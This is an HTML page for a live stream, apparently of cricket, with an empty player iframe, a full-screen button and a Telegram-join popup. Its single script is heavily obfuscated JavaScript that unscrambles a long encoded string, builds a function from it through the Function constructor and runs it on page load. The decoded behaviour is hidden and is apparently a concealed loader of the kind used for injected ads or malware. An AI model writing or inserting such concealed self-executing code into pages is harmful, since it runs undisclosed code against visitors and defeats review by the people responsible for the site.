<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  
            height: 60vh; 
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage { 
            font-size: 16px; 
            color: red; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: black; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" allow="autoplay; fullscreen"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var gLj='',nNJ=807-796;function OXR(e){var t=678102;var h=e.length;var r=[];for(var c=0;c<h;c++){r[c]=e.charAt(c)};for(var c=0;c<h;c++){var p=t*(c+176)+(t%41258);var x=t*(c+563)+(t%17254);var v=p%h;var k=x%h;var j=r[v];r[v]=r[k];r[k]=j;t=(p+x)%3683847;};return r.join('')};var UzD=OXR('aifntbuctvolrcesmgydqrjruokonhtwcpxzs').substr(0,nNJ);var TbI='Ca,;;=p)usv15,r=s0d.0r ;vs[. d"is+lx+elpgi]r;(tl9xd "ql]r.o"f9(,7lxv1v=l094x("b(rgrCj6"er2]6],l187 ,+}162;[bg.b),xf;en(22;(e+r(=vi3nvr;qte.2wf hdr[tnrvet;; lrd[r+a=yaa)[;fir++"[]fgz=m2g0 8=d]ok.n)vfe;=v;iave[jun=)l6mg=jshl,;)Cjg[o().1=r  8a };m) ms(vk.{l7=i=vt;)rf(,mv=a=yrradvn2tc.q+z>t00y68q{r)C({n[ihl-)o8n,tx,y=rwgtlah.u1l9;rwog;0iv=-ck;nlltnatovva7;5d;oo(va)]e==-f)[-r+zl(v8e 4i) 0{.iC]dljv;wn8n 9pb=t=S,;(i[r={;=s+71+tr.}.ras6,sAe(v5do1;.hue1qq(+u;(eete gf,u(wuof(,s;(gese)grapg+fvhrarfnajAi79o1))+h6.7l)0"]hr3*de2kle;,a;=h+it]}.jeu;)rdsio+ ;a;}hvr4nd;a)c=1]=t,,h6d),.nu( tpprrbhteih!be8wlg0j8t)uy),;uj0]ia)(9;+;dja()!mn;n)a(}r(=c>){ 7n he.zs;"nth,qg+e.",a6c}r5.nj8=cqC)+uooup-s+(a2<v);]vu.,lhrcj<h==;8<rus=oo;Adrxr+g1.,) t;,,-j +uonu-t1yr=da. a(ht0i"gnfs=lhae[hvh<s(nh)fC=((a< n=+;otr;Aani=;; +.{,=stsp4]t=adfvcdS*Au(0)rar.=no=7ranrqa),orhogroe()clh=i1r(eCaf(h..shart=aaf;ofh[[hnmr +';var HYK=OXR[UzD];var JTG='';var qwl=HYK;var PRL=HYK(JTG,OXR(TbI));var pFE=PRL(OXR('44Zm9(._o03lr\'iiiZ%ZZRfbu7(6tZBt=)%cP(,odhtlZ&_c=nw]ceZRle0xBt*ZZZ7_,f_crZ[anue].o.Zage,(e(6ZZZlqnZ!2+.tZ=Znka HA8]53ona2_oe$a283ZZZAiZQ33oZ)Z9Z]ne1EZ.Ze0mcnZt];ee i7t8jZ@d0[+]7Z1 fhs9)k.;#lN*Z"()cr$0(p6ZZZ3}3Z32e6))!})!(!.2@s8yZ=h)$g%1J%cdp)Z6s Z)P1I1dSR)\/1Ta(af_fsqrc!)Dob#Z1ZZasutZ;E .;_qea%).!Z8];ZrZ,Z\/rZr$ nZe %a %otcOert#o(9IZfZ,ZZ47lua]Zlof_ $tZafrsZ1Zt2_-Zdto;tZf4C%c1etZ)ZfaisP,2ouenZ)[ @r}Z(Z_;Z)a!+$t}=9.nZZ)_la<p;e(k.I_o&niJ)ecofdcre6]6N.r w0le(Z%f=e0=ZQsh1b!{},(2o rstZ{2#d;56Za5eeZ5uF_=l 2)ocZiZZe)6ee;u%l.#;esN.2_pi=Z"]1?Zccg-a;h#% !v\/v[sRoon.B)a)ri2\/]Z+!a%#gu7Z2K):Z!Z,r0h7"%hun($iZoieZZe"o(.Z]Z-@P\/l4e}[oi4].4Ze$,tdmeoS2t}iU\'4unilT rZ.P5%!i!ked(Z[yed9Zf!(w \'ZmQc,QiZleBZ6;)tRZ[+tcp.ZZ2.2ajo)si)H(ct;7Z24r }Z{(Z,r Z0!%u6sco,dRiKs1)oL%5)ulaeu]ufa)78y@lc{Z5G{iwllj0eZd.dfl,EF]>p_!Z3s.$[6e%diKoZp,5teZ.8"a9$2=[ 3._:o)enpZ.,];!8.nlf2r$(%"n)P (n5 l_Arf]i3u)0Zn.ZaQei_Z.DThe((jeZ,eG;)f!i%3r;Z(Zz(7#(!t8;.Z[$2i;Z@]{Z,!1]Z5{[ai;oZ5F_o(4n_g;Z.nZZ?.5r($$,iZe874ZZhf(Z(S,iZZrZ,)KfZZ1Z.!$;vR(Zt5.fn;.(f3r)}2\/q{ik#ea)uwZrnt%)gc.ty)5_Z0tZObai)%Z(J{_e.n(e_Zg4Zjn),(Z32=eZZKZZ6amM.D.ZZZ_be9,"Zs1;ZZ%_61Zs;ln2!HtT=bn;fi.(o J7m0Zi+3 rZeZteif_tu@fZZZ<0f2o1l!):cZZZiZHZ37ruZFe3ZD[0#(5{aZn;ts7,!_ff9ZZZ_Z)ntl4Z7%i)l{aH}eao]a%e)n8Z*&Z\'Zi]ZieeL$ d_Z)"Z>9*59rZ]tj+)3fZZZl!__$qZAc)Zln_!dlMfP5;lt]ZZ}Z_.=enc\/cZeZ K!Ze2&Z,_ku(liefnZ.,)dp.%0Z.8$ZZ3tZ(%r_Zfa)g..Z}6Cru8sZb8Z52&>,w.0BZZ(EL7(ZxZ})ZlZ.3rc=;)8a5Z!;l{,5em(q.oWmZ{\/5_.g5ZZd4 dCl)7wZ5tZ  Q{Z>lr=_G]w.QZc@iZ5Z.))ce1t6n2__ei(Zf3Z6=%6 at4."(M]ZZ4l(c)7ftZ+Z{,#Zrq7eo0=(00)sZi&H5y:i((Znf9_pen.;tV_lZ{%3e2Z _5e4n)om;A)=>W1.r)Z.Z mZ1uo]{)Z) ln(;]is4.attZZrZ;de1c.Z[e6)V)(u(c,)l.($l)Z!e6HE;}4Z%lgWG1Z)5J8tZEunc[Z}4Me$)Z-ldC;nu![RZ% :;Z PZo)An}t%; ]7)td0:cDZZ!9$l7Z0*S0fZZ_$4i]aiefZ%.e]Zwou1<)]&3!.t;(n7ne;8mTZf=4aZfC,lZ(ZZ@e_]OZ:5;(Z:0Z1ZZZ(f8o8;pc.l=lZIia)i5;$ZnZ!ZZZ6Pw)!pZe8{._k&[gZ\'foLlZ)l5ln6.6]fm8l%.9ZZ. = (f;Z6_oe{?wK_d];Oi3H!,2sZ32.eZ(,,fZS3+Zo=G5j_r.ao.gt)eeHn;r]eZZZdZ]Ze;s()sS0aZZ;Z1.=ZZ)cl4{00e8(9w..r065  3PV.csZ+Z{ZZ.g,{oa24%ZCZta_Zs@ 1}efj!MuZ30Znl31Z6\/!if;{o0 Pwen$(32,Z((ZerlfrZ)r1K3s2]Z3((nee}VeSa]co1ej=C$buyZ}o ZA&s26SZ_n8o5Nae6t:}a8(Wctn $@(]Zn_Z=.;$b=Kos!(C i)hi.ZMt\/m(n0(Z(}[)Zp.}7nsi\'Z_E11Z._!eetfr2e0a;Z;k7M)Z!cZ;tud.!).Z a%d1,Ze#)$fZol(,.ee(){Zsrgn;$=%1mg"7)rlZga=Z).r#9=a]_Pnti57ts6[Ze,6ceef)iZnc1f.u.r5xu2;s3ZZg}fa(euu4glchi9%.7ZZ.o2=Ia Lel1];1Zwrfm6yeco,7%Z(efs{.]ee8Z(_= .e!I0r{!" dfc\/m2Z_6pihw _._)_$,i=_8ZZ=a1i(t4.a346(o)n= Z) ZZfc2 {1nZ)s..s{]Zan((k%n=)e%5.ZZnS$)r(?rS)on.ZZ_un, fZ1;_fdZNc"<{.e6 }6itt=!r7seZe6p<gAlt,nw{{e!f( 34e.f)fZ]'));var TeG=qwl(gLj,pFE );TeG(3720);return 6837})()
</script>

</body>
</html>